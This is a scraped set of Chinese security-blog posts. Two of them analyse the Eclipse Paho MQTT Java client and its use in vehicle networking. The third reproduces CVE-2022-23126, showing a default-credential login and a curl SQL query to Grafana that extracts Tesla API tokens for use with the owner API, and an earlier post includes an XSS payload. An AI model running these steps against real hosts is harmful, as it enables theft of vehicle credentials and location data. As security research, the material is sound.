(factoryFactory != null) { String[] enabledCiphers = factoryFactory.getEnabledCipherSuites(null); if (enabledCiphers != null) { ((SSLNetworkModule) netModule).setEnabledCiphers(enabledCiphers); } } break; case MqttConnectOptions.URI_TYPE_WS: if (port == -1) { port = 80; } if (factory == null) { factory = SocketFactory.getDefault(); } else if (factory instanceof SSLSocketFactory) { throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH); } netModule = new WebSocketNetworkModule(factory, address, host, port, clientId); ((WebSocketNetworkModule)netModule).setConnectTimeout(options.getConnectionTimeout()); break; case MqttConnectOptions.URI_TYPE_WSS: if (port == -1) { port = 443; } SSLSocketFactoryFactory wSSFactoryFactory = null; if (factory == null) { wSSFactoryFactory = new SSLSocketFactoryFactory(); Properties sslClientProps = options.getSSLProperties(); if (null != sslClientProps) wSSFactoryFactory.initialize(sslClientProps, null); factory = wSSFactoryFactory.createSocketFactory(null); } else if ((factory instanceof SSLSocketFactory) == false) { throw ExceptionHelper.createMqttException(MqttException.REASON_CODE_SOCKET_FACTORY_MISMATCH); } // Create the network module... netModule = new WebSocketSecureNetworkModule((SSLSocketFactory) factory, address, host, port, clientId); ((WebSocketSecureNetworkModule)netModule).setSSLhandshakeTimeout(options.getConnectionTimeout()); // Ciphers suites need to be set, if they are available if (wSSFactoryFactory != null) { String[] enabledCiphers = wSSFactoryFactory.getEnabledCipherSuites(null); if (enabledCiphers != null) { ((SSLNetworkModule) netModule).setEnabledCiphers(enabledCiphers); } } break; default: // This shouldn't happen, as long as validateURI() has been called. log.fine(CLASS_NAME,methodName, &quot;119&quot;, new Object[] {address}); netModule = null; } return netModule; } 代码很多但是不难读，首先作用是工厂方法创建正确的网络模块。开始通过getSocketFactory获取工厂，默认为null，然后利用之前讲过的MqttConnectOptions#validateURI去判断serverURI的类型 tcp-&gt;0 ssl-&gt;1 local-&gt;2 ws-&gt;3 wss-&gt;4 然后创建URL对象 如果address包含_或者URL对象获取Host失败，就会尝试利用反射已经MqttAsyncClient#getHostName方法去解析不正常的address 正常就通过URL对象直接获取Host和Port 在通过不同的serverURL类型来进入不同的处理，这里以tcp为例讲一下（ssl和wss会因为加密多一些步骤） 首先如果port没有给出，会根据不同类型赋一个默认的值 tcp-&gt;1883 ssl-&gt;8883 ws-&gt;80 wss-&gt;443 然后SocketFactory#getDefault返回环境默认套接字工厂的副本，在利用这个套接字去创建TCP的网络模块TCPNetworkModule对象去返回 然后ClientComms#setNetworkModules获取到TCPNetworkModule并赋值给networkModules 回到org.eclipse.paho.client.mqttv3.MqttAsyncClient#connect networkModules之后将automaticReconnect值作为参数传入（默认为false）创建MqttReconnectCallback对象，然后赋值给CommsCallback的reconnectInternalCallback参数 ConnectActionListener 通过ClientId创建了MqttToken，MqttToken是提供一种机制来跟踪异步操作的完成情况（这里不着重讲了）。 再往下创建ConnectActionListener对象，用来处理 AsyncClient 到可用 URL 之一的连接。 在创建客户端时作提供单一URL ，或者作为连接选项中的列表提供，尝试连接到列表中的每个 URL，直到连接尝试成功或尝试了所有 URL 此类使用自己的 onSuccess 和 onFailure 回调，而不是用户提供的回调 如果连接成功，则通知用户令牌并调用 用户的onSuccess 回调函数 如果连接失败，则尝试列表中的另一个 URL 如果已经没有URL则通知用户令牌并调用 onFailure 回调 回到org.eclipse.paho.client.mqttv3.MqttAsyncClient#connect 调用了MqttToken#setActionCallback来将ConnectActionListener对象注册为侦听器以在操作完成时收到通知。 再调用MqttToken#setUserContext上下文来存储MqttAsyncClient对象。 后面是一个可选项 If we are using the MqttCallbackExtended, set it on the // connectActionListener if (this.mqttCallback instanceof MqttCallbackExtended) { connectActionListener.setMqttCallbackExtended((MqttCallbackExtended) this.mqttCallback); } 如果使用 MqttCallbackExtended，请将其设置在connectActionListener里，而MqttCallbackExtended是用来扩展MqttCallback以允许新的回调而不破坏现有应用程序的 API实现此接口的类可以在两种类型的客户端上注册：IMqttClient.setCallback(MqttCallback) 和IMqttAsyncClient.setCallback(MqttCallback) 之后ClientComms#setNetworkModuleIndex设置了网络模块的索引 然后调用ConnectActionListener#connect（这里才是连接的开始），也就是上面创建的ConnectActionListener对象 MqttToken已经说过了，而org.eclipse.paho.client.mqttv3.MqttClientPersistence#open是用来初始化持久存储，在之前MqttClient类对象的创建里指定MqttClient它将用于持久化 QoS 1 和 2 消息。 之后是参数的配置1.是否会话维持2.设置MQTT版本 然后调用了org.eclipse.paho.client.mqttv3.internal.ClientComms#connect，如果失败调用onFailure这里前文讲了 漆面是通过MqttConnectOptions传递进来的参数来创建MqttConnect对象，然后进行一些配置设置，基本上前文都涉及到了。 ConnectBG 这里重点看一下连接的实现org.eclipse.paho.client.mqttv3.internal.ClientComms.ConnectBG#start ConnectBG是实现了Runnable的类，运行在线程池中 这里看一下线程体的run方法 首先看关键主题内容，启动网络模块，发起网络连接 NetworkModule networkModule = networkModules[networkModuleIndex]; networkModule.start(); 进入到org.eclipse.paho.client.mqttv3.internal.NetworkModule#start 四个实现类 这里我们进入TCP分析 可以看到调用了socket去实现连接 连接完成后，启动receiver和，负责从broker接收消息以及向broker发送消息，两个类都实现了Runnable的类，运行在线程池中，直接看run函数 receiver = new CommsReceiver(clientComms, clientState, tokenStore, networkModule.getInputStream()); receiver.start(&quot;MQTT Rec: &quot;+getClient().getClientId(), executorService); sender = new CommsSender(clientComms, clientState, tokenStore, networkModule.getOutputStream()); sender.start(&quot;MQTT Snd: &quot;+getClient().getClientId(), executorService); receiver收到消息后，响应消息的消息类型为MqttAck，由于CONACK数据包是MqttAck类型，且token不为null，故会执行clientState.notifyReceivedAck函数. public void run() { recThread = Thread.currentThread(); recThread.setName(threadName); final String methodName = &quot;run&quot;; MqttToken token = null; try { runningSemaphore.acquire(); } catch (InterruptedException e) { running = false; return; } while (running &amp;&amp; (in != null)) { try { //@TRACE 852=network read message log.fine(CLASS_NAME,methodName,&quot;852&quot;); receiving = in.available() &gt; 0; MqttWireMessage message = in.readMqttWireMessage(); receiving = false; // instanceof checks if message is null if (message instanceof MqttAck) { token = tokenStore.getToken(message); if (token!=null) { synchronized (token) { // Ensure the notify processing is done under a lock on the token // This ensures that the send processing can complete before the // receive processing starts! ( request and ack and ack processing // can occur before request processing is complete if not! clientState.notifyReceivedAck((MqttAck)message); } } else if(message instanceof MqttPubRec || message instanceof MqttPubComp || message instanceof MqttPubAck) { //This is an ack for a message we no longer have a ticket for. //This probably means we already received this message and it's being send again //because of timeouts, crashes, disconnects, restarts etc. //It should be safe to ignore these unexpected messages. log.fine(CLASS_NAME, methodName, &quot;857&quot;); } else { // It its an ack and there is no token then something is not right. // An ack should always have a token assoicated with it. throw new MqttException(MqttException.REASON_CODE_UNEXPECTED_ERROR); } } else { if (message != null) { // A new message has arrived clientState.notifyReceivedMsg(message); } } } catch (MqttException ex) { //@TRACE 856=Stopping, MQttException log.fine(CLASS_NAME,methodName,&quot;856&quot;,null,ex); running = false; // Token maybe null but that is handled in shutdown clientComms.shutdownConnection(token, ex); } catch (IOException ioe) { //@TRACE 853=Stopping due to IOException log.fine(CLASS_NAME,methodName,&quot;853&quot;); running = false; // An EOFException could be raised if the broker processes the // DISCONNECT and ends the socket before we complete. As such, // only shutdown the connection if we're not already shutting down. if (!clientComms.isDisconnecting()) { clientComms.shutdownConnection(token, new MqttException(MqttException.REASON_CODE_CONNECTION_LOST, ioe)); } } finally { receiving = false; runningSemaphore.release(); } } //@TRACE 854=&lt; log.fine(CLASS_NAME,methodName,&quot;854&quot;); } notifyReceivedAck函数中，处理各种broker返回消息，而连接消息处理最后会到connected()连接完成的方法中，该方法设置连接完成状态以及开始发送心跳。 protected void notifyReceivedMsg(MqttWireMessage message) throws MqttException { final String methodName = &quot;notifyReceivedMsg&quot;; this.lastInboundActivity = System.currentTimeMillis(); // @TRACE 651=received key={0} message={1} log.fine(CLASS_NAME, methodName, &quot;651&quot;, new Object[] { new Integer(message.getMessageId()), message }); if (!quiescing) { if (message instanceof MqttPublish) { MqttPublish send = (MqttPublish) message; switch (send.getMessage().getQos()) { case 0: case 1: if (callback != null) { callback.messageArrived(send); } break; case 2: persistence.put(getReceivedPersistenceKey(message), (MqttPublish) message); inboundQoS2.put(new Integer(send.getMessageId()), send); this.send(new MqttPubRec(send), null); break; default: //should NOT reach here } } else if (message instanceof MqttPubRel) { MqttPublish sendMsg = (MqttPublish) inboundQoS2 .get(new Integer(message.getMessageId())); if (sendMsg != null) { if (callback != null) { callback.messageArrived(sendMsg); } } else { // Original publish has already been delivered. MqttPubComp pubComp = new MqttPubComp(message .getMessageId()); this.send(pubComp, null); } } } } sender不断循环从clientState获取待发送的消息然后通过org.eclipse.paho.client.mqttv3.internal.ClientState#notifySent将 MQTT连接的消息发送出去 public void run() { sendThread = Thread.currentThread(); sendThread.setName(threadName); final String methodName = &quot;run&quot;; MqttWireMessage message = null; try { runningSemaphore.acquire(); } catch (InterruptedException e) { running = false; return; } try { while (running &amp;&amp; (out != null)) { try { message = clientState.get(); if (message != null) { //@TRACE 802=network send key={0} msg={1} log.fine(CLASS_NAME,methodName,&quot;802&quot;, new Object[] {message.getKey(),message}); if (message instanceof MqttAck) { out.write(message); out.flush(); } else { MqttToken token = tokenStore.getToken(message); // While quiescing the tokenstore can be cleared so need // to check for null for the case where clear occurs // while trying to send a message. if (token != null) { synchronized (token) { out.write(message); try { out.flush(); } catch (IOException ex) { // The flush has been seen to fail on disconnect of a SSL socket // as disconnect is in progress this should not be treated as an error if (!(message instanceof MqttDisconnect)) { throw ex; } } clientState.notifySent(message); } } } } else { // null message //@TRACE 803=get message returned null, stopping} log.fine(CLASS_NAME,methodName,&quot;803&quot;); running = false; } } catch (MqttException me) { handleRunException(message, me); } catch (Exception ex) { handleRunException(message, ex); } } // end while } finally { running = false; runningSemaphore.release(); } //@TRACE 805=&lt; log.fine(CLASS_NAME, methodName,&quot;805&quot;); } 然后启动回调监听 callback.start(&quot;MQTT Call: &quot;+getClient().getClientId(), executorService); 最后调用internalSend发送mqtt的CONNECT数据包 internalSend(conPacket, conToken); org.eclipse.paho.client.mqttv3.internal.ClientState#send来进行发送 单单连接broker的流程分析就十分繁琐，剩下的流程分析创建主题和发布主题内容是一个入口，订阅主题和接收主题内容也是一个入口，这里给出流程的入口，感兴趣可以一步一步调试分析 创建主题&amp;发布主题内容 入口函数：org.eclipse.paho.client.mqttv3.MqttAsyncClient#publish() 订阅主题&amp;接收主题内容 入口函数：org.eclipse.paho.client.mqttv3.MqttAsyncClient#subscribe() MQTT安全 直接通过实例来了解一下MQTT安全。由于MQTT运用也比较新，而java库Eclipse Paho Java Client相关漏洞就更少，对于他本身并没有什么漏洞，而是有两个MQTT信息接收之后存储输出不当的例子。 分别是hivemq(CVE-2020-13821)和apache-artemis(CVE-2020-13932) 这里使用mosquitto作为客户端去实现 hivemq(CVE-2020-13821) 这里是利用clintid来进行攻击 连接broker 刷新snapshot，没有过滤直接打印了客户端的clintid导致xss apache-artemis(CVE-2020-13932) 访问 http://192.168.100.247:8161/ 构造恶意的clientid或topics名字来攻击控制台 &lt;img src=x onerror=alert(1)&gt; 这里通过主题名称来进行攻击，在Diagram模块将未过滤的主题名称直接打印导致xss 上面两个例子虽然在MQTT协议中都不属于客户端而是Broker，但是也可以看到在MQTT中web漏洞的重点是信息的交互 如果应用了客户端，用来连接broker以及接收和发送主题信息 发送是自己控制所以不可控的就是接收的主题信息，就要做好过滤以及减少可能的危险操作 如果是应用的broker，用来处理连接的信息以及客户端之间交互的主题信息 那么连接信息和客户端之间交互的信息都是不可控的，更要做好充足的过滤以及防护手段 在web应用层对于MQTT协议来说，更多的漏洞是在于你对信息的处理不当 除了以上两个项目还有很多使用mqtt客户端或broker的物联网项目如 wso2 thingsboard 也可以根据信息获取之后的利用来进行漏洞分析 参考 mqttv3文档：https://www.eclipse.org/paho/files/javadoc/index.html mqttv3项目：https://github.com/eclipse/paho.mqtt.java apache-artemis漏洞环境：https://www.apache.org/dyn/closer.cgi?filename=activemq/activemq-artemis/2.22.0/apache-artemis-2.22.0-bin.tar.gz&amp;action=download hivemq漏洞环境：docker pull hivemq/hivemq4:4.3.2 ","link":"https://liangyueliangyue.github.io/post/mqtt-xie-yi-eclipse-paho-java-client-yuan-ma-fen-xi-er/"},{"title":"少年黑了特斯拉？CVE-2022-23126分析与复现","content":"CVE-2022-23126 首发于火线Zone：https://zone.huoxian.cn/d/1235-cve-2022-23126 详情：https://medium.com/@david_colombo/how-i-got-access-to-25-teslas-around-the-world-by-accident-and-curiosity-8b9ef040a028 2022年1月份，年轻黑客宣称远程控制了25 辆特斯拉 其实就是这个cve的来源，而真正的漏洞来自于https://github.com/adriankumpf/teslamate暴露在外网端口上 teslamate是Tesla 的功能强大的自托管数据记录器 特点： 通过Elixir编写 数据存储在Postgres数据库中 使用Grafana进行可视化和数据分析 车辆数据发布到本地MQTT Broker 先从作者的文章来看看这个漏洞的细节 信息泄露 访问dockerfile默认暴露的4000端口可以得到特斯拉地址信息 但因为使用了grafana，如果开启了匿名访问（即免登陆访问），且3000端口也暴露在公网，那么grafana就会泄露大量数据如：特斯拉去过的地方，充电的地方，当前位置，通常停放的地方，驾驶时间，旅行速度，导航请求，软件更新历史，甚至特斯拉周围的天气历史等等多得多。 Grafana Grafana 是一个监控仪表系统，它是由 Grafana Labs 公司开源的的一个系统监测 (System Monitoring) 工具。它可以大大帮助你简化监控的复杂度，你只需要提供你需要监控的数据，它就可以帮你生成各种可视化仪表。同时它还有报警功能，可以在系统出现问题时通知你。 修复措施 也就是将默认开启的匿名访问关闭 进一步获取Tesla 用户API 密钥 grafana确实保存了 API 密钥，它还存储了所有其他数据。API 密钥既不单独存储也不加密。但需要Grafana Explore来运行自定义查询。这需要身份验证（经过测试，匿名访问不需要身份验证）。 然后就是利用默认密码（admin/admin）/弱口令来进行身份验证，然后得到查询权限 如何访问世界各地的随机特斯拉 在互联网范围内搜索 TeslaMate 实例（例如搜索 MQTT 代理）。 确保它们使用不安全的默认 Docker 配置运行（这应该现在已经修复，因为用户请尽快拉取最新版本）。 转到端口 3000 以访问 Grafana 仪表板。 使用默认凭据登录*（当然只有在明确授权的情况下才能这样做）*。 转到资源管理器选项卡。 使用查询生成器提取 API 并刷新令牌。 玩特斯拉（当然仅限于您拥有的车辆），玩得开心。 使用 Tesla API 令牌可以做的事情包括但不限于： 解锁车门。 打开窗户。 开始无钥匙驾驶。 与特斯拉分享视频。 更改加热器/冷却器设置。 按喇叭和闪烁的灯光。 最终结果是特斯拉撤销了数千个密钥，所以这可能是一个更普遍的问题。 实例复现 互联网一个实例（外国） 获取tesla key 4000端口默认开放,访问可以得到地理位置等一些信息 访问3000，开启了匿名访问 那么可以直接得到更多tesla信息 然后访问explorer数据库查询接口通过sql语句查询获取key curl http://xxxx:3000/api/tsdb/query {&quot;queries&quot;:[{&quot;refId&quot;:&quot;A&quot;,&quot;intervalMs&quot;:60000,&quot;maxDataPoints&quot;:1843,&quot;datasourceId&quot;:1,&quot;rawSql&quot;:&quot;SELECT\\n id AS \\&quot;time\\&quot;,\\n *\\nFROM tokens\\nORDER BY 1&quot;,&quot;format&quot;:&quot;table&quot;}]} 如果，没开启匿名访问，需要尝试默认密码或者弱口令，成功登录后一样获取信息或者使用explorer进行查询key 得到数据库中的Tesla key access: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 前面加bearer (也就是jwt)然后访问Tesla官方api接口 https://www.teslaapi.io/ 获取车辆列表 https://owner-api.teslamotors.com/api/1/vehicles 得到车辆id（注意这里是id不是vehicles_id） 再获取车辆信息 https://owner-api.teslamotors.com/api/1/vehicles/xxxx/vehicle_data 官方还提供了对车的种种操作比原文作者说的更多 这里未授权就不进行深入尝试了 后记 复现下来，这是一个tesla的开源项目的漏洞和tesla本身并没有什么联系，漏洞利用难度也很低，只是web应用层的简单利用，但是影响也不小。即使在现在互联网上还是有很多存在漏洞的实例。 ","link":"https://liangyueliangyue.github.io/post/shao-nian-hei-liao-te-si-la-cve-2022-23126-fen-xi-yu-fu-xian/"},{"title":"MQTT协议-车联网应用&&源码分析（一）","content":"MQTT协议 首发于跳跳糖：https://tttang.com/archive/1609/ Message Queue Telemetry Transport，消息队列遥测传输 MQTT是基于TCP/IP协议栈构建的异步通信消息协议，是一种轻量级的发布、订阅信息传输协议。可在不可靠的网络环境中进行扩展，适用于设备硬件存储空间或网络带宽有限的场景。使用MQTT协议，消息发送者与接收者不受时间和空间的限制。基于发布/订阅模式的物联网通信协议，简单易实现、支持 QoS、报文小等特点，专门为网络受限设备、低宽带以及高延迟和不可靠的网络而设计。由于以上轻量级的特点，是实现智能家居的首选传输协议。 具体的工作原理学习可以参考以下几个链接，这里不着重讲了 http://www.taichi-maker.com/homepage/esp8266-nodemcu-iot/iot-tuttorial/mqtt-tutorial/ https://zhuanlan.zhihu.com/p/89057819 https://zhuanlan.zhihu.com/p/386994328 http://www.taichi-maker.com/homepage/esp8266-nodemcu-iot/iot-tuttorial/mqtt-tutorial/ MQTT 协议在车联网中的应用 车辆数据主动上报 车载设备（T-box，车机等）作为车辆运行数据的收集者，基于固定频率将车内各类控制器、传感器等数据打包发送到平台端。 例如在用户同意的前提下，车辆在行驶过程中会将位置、车速、电量等信息按照固定频率上报云平台，云端应用基于这些数据，提供位置查找、超速提醒、电量提醒、地理围栏服务给终端用户使用。 车-&gt;broker-&gt;云平台-&gt;broker-&gt;车 平台请求下发后车辆数据上报 当云平台需要获取车辆的最新状态及信息时，可以主动下发命令要求车辆上报数据。 例如在诊断场景下，平台通过 MQTT 下发诊断命令至车辆，当车内各设备完成诊断操作后，会将诊断数据打包后上报至云平台，车辆诊断工程师将根据采集到的诊断数据对于车况进行整体的分析及问题定位。 平台-&gt;broker-&gt;车-&gt;broker-&gt;平台 平台指令下发 车辆远程控制是车联网业务中最常见、最典型的场景，各主机厂均在手机 App 中提供各种远控功能，例如远程启动、远程开车门、远程闪灯鸣笛等等。 此类场景下，手机 App 发送控制命令至云平台，平台应用经过权限检查、安全检查等一系列操作后，通过 MQTT 将命令下发至车辆执行，车辆端执行成功后，异步通知平台执行结果。 app-&gt;云平台-&gt;broker-&gt;车 车辆客户端请求后平台数据下发 在 SDV（软件定义汽车）的大背景下，车内很多配置是可以做到动态变化的，例如数据采集规则、安全访问规则，所以车辆在点火启动后，会主动请求平台最新的相关配置，若两侧配置不一致，平台侧会下发最新的配置信息至车辆，车辆侧实时生效。 车-&gt;broker-&gt;云平台-&gt;broker-&gt;车 数据集成 将流经 EMQX 的海量车联网数据与业务系统连接是客户最重视的能力，EMQX 内置了规则引擎和数据桥接能力，可以将 MQTT 数据流式传输到 Kafka、各类 SQL / NoSQL / 时序数据库中，而实际项目中绝大多数客户都使用 Kafka 作为后端流处理组件。 Kafka 专注于数据的存储和读取，而 EMQX 则侧重于客户端和服务器之间的通信，EMQX 用来快速接收和处理来自大量物联网设备的消息，Kafka 可以收集并存储这些数据并将其发送给后端程序来分析和处理，这个架构是目前应用最广的数据集成方案。 车-&gt;broker-&gt;数据库 EMQX中http转发 EMQX (Erlang/Enterprise/Elastic MQTT Broker) 是基于 Erlang/OTP 平台开发的开源物联网 MQTT 消息服务器，承担MQTT协议中broker角色。 下面利用EMQX承担broker，java mqttv3 以及mqtt.fx承担client来简单模拟一个用户车上报车速云平台下发通知的过程。 车主动上报车速 这里是通过MQTT.fx来担任车的mqtt消息发送 连接配置 发布主题信息 接收主题信息 EMQX将MQTT信息转发至云平台 首先创建web服务资源 然后创建响应动作 最后编辑规则 即可将http请求进行转发 云平台通过MQTT信息返回消息 这里可以平台端直接订阅车端car_speed拿到信息然后返回 信息接收+处理 package at.dallermassl.ap.security.taint.webapp; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class Test2 extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { String speed = request.getParameter(&quot;car_speed&quot;); System.out.println(&quot;speed：&quot;+speed); String serverURI=&quot;tcp://192.168.100.146:1883&quot;; String clientID=&quot;message_send&quot;; MqttProducer mqttProducer = new MqttProducer(serverURI, clientID); String msg =&quot;&quot;; if (Integer.parseInt(speed)&gt;=90){ msg = &quot;hypervelocity in time:&quot; + System.currentTimeMillis() ; mqttProducer.send(&quot;car/message&quot;, 1, true, msg); }else { msg = &quot;normal in time:&quot;+ System.currentTimeMillis(); mqttProducer.send(&quot;car/message&quot;, 1, true, msg); } } catch (Exception e) { e.printStackTrace(); } } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doGet(request, response); } } MqttProducer package at.dallermassl.ap.security.taint.webapp; import org.eclipse.paho.client.mqttv3.MqttClient; import org.eclipse.paho.client.mqttv3.MqttConnectOptions; import org.eclipse.paho.client.mqttv3.MqttException; import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence; public class MqttProducer { private MqttClient mqttClient; public MqttProducer(String SERVER_URI,String CLIENT_ID){ try { MemoryPersistence persistence = new MemoryPersistence(); mqttClient = new MqttClient(SERVER_URI, CLIENT_ID,persistence); MqttConnectOptions connOpts = new MqttConnectOptions(); connOpts.setCleanSession(true); System.out.println(&quot;Connecting to broker: &quot;+ SERVER_URI); mqttClient.connect(connOpts); }catch (Exception ex){ ex.printStackTrace(); } } public void send(String topic, int qos, boolean retained, String payload) { if (mqttClient == null){ return; } try { mqttClient.publish(topic, payload.getBytes(), qos, retained); } catch (MqttException e) { System.out.println(e.getMessage()); } } } 最后成果 idea接收信息 客户端直接返回 车端连接 broker emqx 云平台 package com.example.demo.mqtt; public class Test2 { public static void main(String[] args) { String serverURI=&quot;tcp://192.168.100.146:1883&quot;; String clientID=&quot;cloud_platform&quot;; MqttSubscriber mqttSubscriber = new MqttSubscriber(serverURI, clientID); mqttSubscriber.subscribe(&quot;car/speed&quot;); } } MqttSubscriber package com.example.demo.mqtt; import org.eclipse.paho.client.mqttv3.*; import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence; public class MqttSubscriber { private MqttClient mqttClient; public MqttSubscriber(String SERVER_URI,String CLIENT_ID){ try { MemoryPersistence persistence = new MemoryPersistence(); mqttClient = new MqttClient(SERVER_URI, CLIENT_ID,persistence); MqttConnectOptions connOpts = new MqttConnectOptions(); connOpts.setCleanSession(true); mqttClient.connect(connOpts); }catch (Exception ex){ ex.printStackTrace(); } } public void subscribe(String topic) { String SERVER_URI = &quot;tcp://192.168.100.146:1883&quot;; String CLIENT_ID = &quot;cloud_platform_send&quot;; if (mqttClient == null){ return; } try { mqttClient.subscribe(topic); mqttClient.setCallback(new MqttCallback() { @Override public void connectionLost(Throwable throwable) { System.out.println(&quot;连接丢失&quot;); } @Override public void messageArrived(String topic, MqttMessage mqttMessage) throws Exception { System.out.println(topic); System.out.println(mqttMessage.toString()); MqttProducer mqttProducer = new MqttProducer(SERVER_URI, CLIENT_ID); String msg =&quot;&quot;; if (Integer.parseInt(mqttMessage.toString())&gt;=90){ msg = &quot;hypervelocity! in time:&quot; + System.currentTimeMillis(); }else { msg = &quot;normal! in time:&quot;+ System.currentTimeMillis(); } mqttProducer.send(&quot;car/message&quot;, 1, true, msg); } @Override public void deliveryComplete(IMqttDeliveryToken iMqttDeliveryToken) { System.out.println(&quot;delivery isComplete:&quot; + iMqttDeliveryToken.isComplete()); } }); } catch (MqttException e) { System.out.println(e.getMessage()); } } } 最终效果和http转发一致 idea返回信息 MQTT-v3 客户端库 在上面使用java代码中使用的是Eclipse Paho Java Client Eclipse Paho Java Client (opens new window)是用 Java 编写的 MQTT 客户端库（MQTT Java Client），可用于 JVM 或其他 Java 兼容平台（例如Android）。Eclipse Paho Java Client 提供了MqttAsyncClient 和 MqttClient 异步和同步 API。 从上面的简单的示例代码先学习一下一些概念 MqttClient 继承自IMqttClient接口，定义了如下方法 基本可以做到望字知意。 再回到MqttClient，仔细看构造函数，可以发现MqttClient对象中还创建了org.eclipse.paho.client.mqttv3.MqttAsyncClient public MqttClient(String serverURI, String clientId) throws MqttException { this(serverURI, clientId, new MqttDefaultFilePersistence()); } public MqttClient(String serverURI, String clientId, MqttClientPersistence persistence) throws MqttException { this.aClient = null; this.timeToWait = -1L; this.aClient = new MqttAsyncClient(serverURI, clientId, persistence); } public MqttClient(String serverURI, String clientId, MqttClientPersistence persistence, ScheduledExecutorService executorService) throws MqttException { this.aClient = null; this.timeToWait = -1L; this.aClient = new MqttAsyncClient(serverURI, clientId, persistence, new ScheduledExecutorPingSender(executorService), executorService); } org.eclipse.paho.client.mqttv3.MqttAsyncClient中定义了mqtt客户端参数 实现自IMqttAsyncClient接口，方法如下（基本和IMqttClient一样） 查看package.html对两个接口的描述 {@link org.eclipse.paho.client.mqttv3.IMqttAsyncClient MqttAsyncClient} which provides a non-blocking interface {@link org.eclipse.paho.client.mqttv3.IMqttClient MqttClient} where methods block until the operation has completed. 可以知道IMqttAsyncClient是非堵塞的而IMqttClient是堵塞的 再从文档看接口描述： IMqttClient 提供了一组方法，一旦 MQTT 操作完成，就会阻止并将控制权返回给应用程序。它是位于 IMqttAsyncClient 实现之上的薄层，主要用于与早期版本的 MQTT 客户端兼容。在大多数情况下，建议使用基于 IMqttAsyncClient 的客户端，它允许应用程序混合非阻塞和阻塞调用。 如果使用基于 IMqttAsyncClient 的客户端，则应用程序不限于使用一种样式，因为可以在同一应用程序中使用阻塞和非阻塞方法。如果使用基于 IMqttClient 的客户端，则应用程序只能使用阻塞方法。有关阻塞客户端的更多详细信息，请参阅 IMqttClient 显然，常用者是MqttAsyncClient ，实际调试看看 MqttClient中存储的只有MqttAsyncClient 对象 MqttAsyncClient 看一下IMqttAsyncClient 方法，首先是静态方法 static { log = LoggerFactory.getLogger(&quot;org.eclipse.paho.client.mqttv3.internal.nls.logcat&quot;, CLASS_NAME); reconnectDelay = 1000; clientLock = new Object(); } 定义了log对象，mqtt重连延迟，以及锁，再来看构造方法 public MqttAsyncClient(String serverURI, String clientId) throws MqttException { this(serverURI, clientId, new MqttDefaultFilePersistence()); } public MqttAsyncClient(String serverURI, String clientId, MqttClientPersistence persistence) throws MqttException { this(serverURI, clientId, persistence, new TimerPingSender()); } public MqttAsyncClient(String serverURI, String clientId, MqttClientPersistence persistence, MqttPingSender pingSender) throws MqttException { this(serverURI, clientId, persistence, pingSender, (ScheduledExecutorService)null); } public MqttAsyncClient(String serverURI, String clientId, MqttClientPersistence persistence, MqttPingSender pingSender, ScheduledExecutorService executorService) throws MqttException { this.reconnecting = false; log.setResourceName(clientId); if (clientId == null) { throw new IllegalArgumentException(&quot;Null clientId&quot;); } else { int clientIdLength = 0; for(int i = 0; i &lt; clientId.length() - 1; ++i) { if (Character_isHighSurrogate(clientId.charAt(i))) { ++i; } ++clientIdLength; } if (clientIdLength &gt; 65535) { throw new IllegalArgumentException(&quot;ClientId longer than 65535 characters&quot;); } else { MqttConnectOptions.validateURI(serverURI); this.serverURI = serverURI; this.clientId = clientId; this.persistence = persistence; if (this.persistence == null) { this.persistence = new MemoryPersistence(); } this.executorService = executorService; if (this.executorService == null) { this.executorService = Executors.newScheduledThreadPool(10); } log.fine(CLASS_NAME, &quot;MqttAsyncClient&quot;, &quot;101&quot;, new Object[]{clientId, serverURI, persistence}); this.persistence.open(clientId, serverURI); this.comms = new ClientComms(this, this.persistence, pingSender, this.executorService); this.persistence.close(); this.topics = new Hashtable(); } } } 最终都指向org.eclipse.paho.client.mqttv3.MqttAsyncClient#MqttAsyncClient(java.lang.String, java.lang.String, org.eclipse.paho.client.mqttv3.MqttClientPersistence, org.eclipse.paho.client.mqttv3.MqttPingSender, java.util.concurrent.ScheduledExecutorService) 首先设置参数和日志，然后clientid不能为null也不能大于65535个字符，然后进入到连接步骤 调用了org.eclipse.paho.client.mqttv3.MqttConnectOptions#validateURI 这里的MqttConnectOptions是一个工具类，用来设置连接的参数以及调用一些连接要用到的方法 public static int validateURI(String srvURI) { try { URI vURI = new URI(srvURI); if (&quot;ws&quot;.equals(vURI.getScheme())) { return 3; } else if (&quot;wss&quot;.equals(vURI.getScheme())) { return 4; } else if (vURI.getPath() != null &amp;&amp; !vURI.getPath().isEmpty()) { throw new IllegalArgumentException(srvURI); } else if (&quot;tcp&quot;.equals(vURI.getScheme())) { return 0; } else if (&quot;ssl&quot;.equals(vURI.getScheme())) { return 1; } else if (&quot;local&quot;.equals(vURI.getScheme())) { return 2; } else { throw new IllegalArgumentException(srvURI); } } catch (URISyntaxException var2) { throw new IllegalArgumentException(srvURI); } } 将serverUrl转为URL对象然后通过getScheme方法来判断使用的网络前缀，并没有获取返回值，只要是这五个网络前缀就不会进入到异常处理（相当于一份白名单处理） 然后进行赋值，serverURL和clientID不用说，persistence是mqtt自己的持久化机制，如果为空则创建org.eclipse.paho.client.mqttv3.persist.MemoryPersistence MqttAsyncClient不传入persistence时也会默认创建一个org.eclipse.paho.client.mqttv3.persist.MqttDefaultFilePersistence 也就是说MqttDefaultFilePersistence是默认方式，但是persistence为null时变为瞬时消息保存在内存中。如果在连接中MqttConnectOptions.setCleanSession(boolean)这个参数为true，那么client掉线下次重连，将清空内存persistence消息，如果为false，就会使用持久化机制去重传。（对应了mqtt协议中CONNECT消息里的CleanSession字段） 再往下创建了线程池，默认size为10，executorService就是返回的线程池。 然后日志记录，调用org.eclipse.paho.client.mqttv3.MqttClientPersistence#open，这里如果是MemoryPersistence则hashtable为空。如果是MqttDefaultFilePersistence则做一个持久化操作：将clientid和serverurl用-拼接然后保存在本地。 public void open(String clientId, String theConnection) throws MqttPersistenceException { if (this.dataDir.exists() &amp;&amp; !this.dataDir.isDirectory()) { throw new MqttPersistenceException(); } else if (!this.dataDir.exists() &amp;&amp; 